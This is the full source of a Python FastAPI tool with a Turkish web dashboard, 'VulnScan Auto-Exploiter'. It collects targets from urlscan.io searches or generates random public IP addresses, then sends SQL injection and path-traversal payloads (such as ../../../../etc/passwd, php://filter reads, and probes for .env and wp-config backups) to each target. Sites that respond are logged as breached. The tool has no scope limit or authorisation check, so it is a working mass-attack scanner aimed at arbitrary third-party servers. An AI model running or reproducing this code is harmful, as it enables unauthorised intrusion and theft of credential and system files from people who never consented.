from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Auto-Exploiter - Global Leak & OSINT Edition")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS exploited 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS leaked_targets 
                     (id INTEGER PRIMARY KEY, source TEXT, target_url TEXT, 
                      leak_info TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET CANLI LOG VE DURUM YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET VE SIZMA PAYLOAD'LARI ---
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive"
}

PHP_PATHS = ["/phpinfo.php", "/info.php", "/.env", "/wp-config.php.bak", "/config.php~"]
SQLI_PAYLOADS = ["'", "\"", "' OR 1=1 --", "1' AND SLEEP(3)--", "1') AND SLEEP(3)--"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query", "SQLSTATE"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"]

# --- API ANAHTARLARI ---
SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
VULNERS_API_KEY = os.environ.get("VULNERS_API_KEY", "")

# --- ASENKRON VERİTABANI KAYDI ---
async def async_save_exploit(url, vuln, payload, data):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO exploited (target_url, vuln_type, payload, extracted_data, timestamp) 
                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
            conn.commit()
    await asyncio.to_thread(db_insert)

async def async_save_leak(source, url, info):
    def db_insert():
        with get_db() as conn:
            c = conn.cursor()
            c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", (source, url, info))
            conn.commit()
    await asyncio.to_thread(db_insert)

# --- GELİŞMİŞ OSINT VE SIZINTI KEŞFİ ---
async def fetch_global_leaks_and_targets(session, limit=50):
    logger.info(f"Gelişmiş OSINT ve Sızıntı Motoru Başlatıldı. (Limit: {limit})")
    targets = set()
    
    # 1. URLScan.io
    try:
        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"']
        for q in queries:
            if len(targets) >= limit: break
            encoded_q = urllib.parse.quote(q)
            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size={limit}"
            async with session.get(url, timeout=10) as res:
                if res.status == 200:
                    data = await res.json()
                    for result in data.get('results', []):
                        if len(targets) >= limit: break
                        page_url = result.get('page', {}).get('url')
                        if page_url and page_url.startswith("http"):
                            targets.add(page_url)
                            await async_save_leak("URLScan", page_url, q)
                await asyncio.sleep(0.5)
    except Exception as e:
        logger.error(f"URLScan Hatası: {e}")

    # Fallback
    if len(targets) == 0:
        logger.warning("Hiçbir API'den yanıt alınamadı. Rastgele IP'ler üretiliyor...")
        while len(targets) < limit:
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            targets.add(f"http://{ip}")
        
    logger.info(f"OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
    return list(targets)

# --- HEDEF TARAMA VE SIZMA FONKSİYONU ---
async def scan_and_exploit(session, target_url):
    report = {"target": target_url, "exploits": [], "status": "OK"}
    try:
        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                return report

            # SQLi
            for payload in SQLI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                try:
                    async with session.get(test_url, timeout=6, ssl=False, headers=HEADERS) as res:
                        text = (await res.text()).lower()
                        for error in SQL_ERRORS:
                            if error in text:
                                report["exploits"].append({"type": "SQLi", "payload": payload, "evidence": error})
                                await async_save_exploit(target_url, "SQLi", payload, error)
                                break
                except asyncio.TimeoutError:
                    pass

            # LFI
            for payload in LFI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                try:
                    async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                        text = await res.text()
                        if "root:x:0:0" in text or "[extensions]" in text:
                            report["exploits"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu!"})
                            await async_save_exploit(target_url, "LFI", payload, "System File Read Success")
                            break
                except asyncio.TimeoutError:
                    pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["exploits"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})
    return report

# --- ARKA PLAN TARAMA GÖREVİ ---
async def run_scan_pipeline(limit: int):
    connector = aiohttp.TCPConnector(limit=50, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = await fetch_global_leaks_and_targets(session, limit)
        logger.info(f"Sızma testi başlıyor... Toplam {len(targets)} hedef.")
        
        semaphore = asyncio.Semaphore(50)
        async def limited_scan(url):
            async with semaphore:
                return await scan_and_exploit(session, url)

        tasks = [limited_scan(url) for url in targets]
        await asyncio.gather(*tasks)
        
    logger.info("Küresel Sızma Testi Tamamlandı. Veritabanı güncellendi.")

# --- API ENDPOINT'LERİ ---
@app.post("/api/auto-scan")
async def auto_scan(background_tasks: BackgroundTasks, limit: int = 50):
    background_tasks.add_task(run_scan_pipeline, limit)
    return {"status": "started", "message": f"Tarama {limit} hedef ile arka planda başlatıldı."}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan | Global Leak & Exploit</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #0a0b0d; --panel: #121418; --border: #22262e;
                --text: #c9d1d9; --accent: #58a6ff; --danger: #f85149;
                --warning: #d29922; --success: #3fb950;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
            
            /* Header & Controls */
            .header { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
            .header-left h1 { font-size: 1.4rem; font-weight: 800; color: #fff; }
            .header-left .subtitle { font-size: 0.8rem; color: var(--danger); font-weight: 600; letter-spacing: 1px; }
            
            .controls { display: flex; align-items: center; gap: 10px; }
            .input-group { display: flex; align-items: center; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 5px 10px; }
            .input-group label { font-size: 0.85rem; color: #8b949e; margin-right: 8px; }
            .input-group input { background: transparent; border: none; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 1rem; width: 60px; outline: none; }
            
            .btn { padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 0.9rem; transition: 0.2s; border: none; color: #fff; }
            .btn-start { background: var(--danger); }
            .btn-start:hover { background: #da3633; }
            .btn-start:disabled { background: #30363d; cursor: not-allowed; color: #8b949e; }
            .btn-clear { background: var(--border); }
            .btn-clear:hover { background: #334155; }

            /* Stats Dashboard */
            .stats-dashboard { display: flex; background: #0d1117; border-bottom: 1px solid var(--border); padding: 10px 25px; gap: 20px; }
            .stat-box { display: flex; flex-direction: column; }
            .stat-label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; font-weight: 600; }
            .stat-value { font-size: 1.2rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
            .stat-value.scanned { color: var(--accent); }
            .stat-value.vuln { color: var(--danger); }
            .stat-value.clean { color: var(--success); }
            .stat-value.error { color: var(--warning); }

            /* Main Layout */
            .main-layout { display: flex; flex: 1; overflow: hidden; }
            
            /* Terminal */
            .terminal-panel { width: 40%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-title { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #8b949e; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between;}
            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
            .log-line { margin-bottom: 4px; word-wrap: break-word; }
            .log-time { color: #484f58; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }
            
            /* Results */
            .results-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
            .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
            
            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 15px; display: flex; flex-direction: column; gap: 8px; }
            .site-card.sizildi { border-left: 4px solid var(--danger); background: rgba(248, 81, 73, 0.05); }
            .site-card.temiz { border-left: 4px solid var(--success); }
            .site-card.hata { border-left: 4px solid var(--warning); opacity: 0.7; }
            
            .site-header { display: flex; justify-content: space-between; align-items: center; }
            .site-url { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text); word-break: break-all; }
            .site-status { font-size: 0.75rem; padding: 4px 10px; border-radius: 4px; font-weight: 600; }
            .status-sizildi { background: rgba(248, 81, 73, 0.2); color: var(--danger); border: 1px solid var(--danger); }
            .status-temiz { background: rgba(63, 185, 80, 0.1); color: var(--success); }
            .status-hata { background: rgba(210, 153, 34, 0.1); color: var(--warning); }
            
            .exploit-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--danger); background: #000; padding: 8px; border-radius: 4px; border: 1px solid #333; margin-top: 5px; }
        </style>
    </head>
    <body>
        <div class="header">
            <div class="header-left">
                <h1>VulnScan Auto-Exploiter</h1>
                <div class="subtitle">GLOBAL LEAK & EXPLOIT MOTORU</div>
            </div>
            <div class="controls">
                <div class="input-group">
                    <label for="targetLimit">Hedef:</label>
                    <input type="number" id="targetLimit" value="50" min="1" max="500">
                </div>
                <button class="btn btn-clear" onclick="clearUI()">Temizle</button>
                <button class="btn btn-start" onclick="startAutoScan()" id="scanBtn">Taramayı Başlat</button>
            </div>
        </div>

        <div class="stats-dashboard">
            <div class="stat-box">
                <span class="stat-label">Taranan</span>
                <span class="stat-value scanned" id="stat-scanned">0</span>
            </div>
            <div class="stat-box">
                <span class="stat-label">Sızılan (Açık)</span>
                <span class="stat-value vuln" id="stat-vuln">0</span>
            </div>
            <div class="stat-box">
                <span class="stat-label">Temiz</span>
                <span class="stat-value clean" id="stat-clean">0</span>
            </div>
            <div class="stat-box">
                <span class="stat-label">Hata / Yanıtsız</span>
                <span class="stat-value error" id="stat-error">0</span>
            </div>
        </div>

        <div class="main-layout">
            <div class="terminal-panel">
                <div class="panel-title">Canlı Sistem Logları</div>
                <div id="terminal" class="terminal"></div>
            </div>
            
            <div class="results-panel">
                <div class="panel-title">Sistem Sonuçları</div>
                <div id="results-list" class="results-list"></div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const resultsList = document.getElementById('results-list');
            
            // Stats
            let countScanned = 0, countVuln = 0, countClean = 0, countError = 0;

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    countScanned++;
                    document.getElementById('stat-scanned').innerText = countScanned;
                    
                    const res = data.data;
                    const card = document.createElement("div");
                    
                    let cardClass = "site-card";
                    let statusClass = "";
                    let statusText = "";
                    
                    if (res.exploits && res.exploits.length > 0) {
                        cardClass += " sizildi";
                        statusClass = "status-sizildi";
                        statusText = "SIZILDI";
                        countVuln++;
                    } else if (res.status !== "OK") {
                        cardClass += " hata";
                        statusClass = "status-hata";
                        statusText = res.status;
                        countError++;
                    } else {
                        cardClass += " temiz";
                        statusClass = "status-temiz";
                        statusText = "TEMİZ";
                        countClean++;
                    }
                    
                    document.getElementById('stat-vuln').innerText = countVuln;
                    document.getElementById('stat-clean').innerText = countClean;
                    document.getElementById('stat-error').innerText = countError;
                    
                    card.className = cardClass;
                    
                    let exploitHtml = "";
                    if (res.exploits && res.exploits.length > 0) {
                        res.exploits.forEach(exp => {
                            exploitHtml += `<div class="exploit-detail">
                                <strong>${exp.type}</strong><br>
                                Payload: ${exp.payload || exp.path}<br>
                                Kanıt: ${exp.evidence}
                            </div>`;
                        });
                    }
                    
                    card.innerHTML = `
                        <div class="site-header">
                            <div class="site-url">${res.target}</div>
                            <div class="site-status ${statusClass}">${statusText}</div>
                        </div>
                        ${exploitHtml}
                    `;
                    
                    resultsList.insertBefore(card, resultsList.firstChild);
                }
            };

            function clearUI() {
                terminal.innerHTML = "";
                resultsList.innerHTML = "";
                countScanned = countVuln = countClean = countError = 0;
                document.getElementById('stat-scanned').innerText = 0;
                document.getElementById('stat-vuln').innerText = 0;
                document.getElementById('stat-clean').innerText = 0;
                document.getElementById('stat-error').innerText = 0;
            }

            async function startAutoScan() {
                const limit = document.getElementById('targetLimit').value || 50;
                const btn = document.getElementById('scanBtn');
                
                btn.disabled = true;
                btn.innerText = "Taranıyor...";
                clearUI();

                try {
                    await fetch(`/api/auto-scan?limit=${limit}`, { method: 'POST' });
                } catch (error) {
                    console.error("API Hatası:", error);
                } finally {
                    btn.disabled = false;
                    btn.innerText = "Taramayı Başlat";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
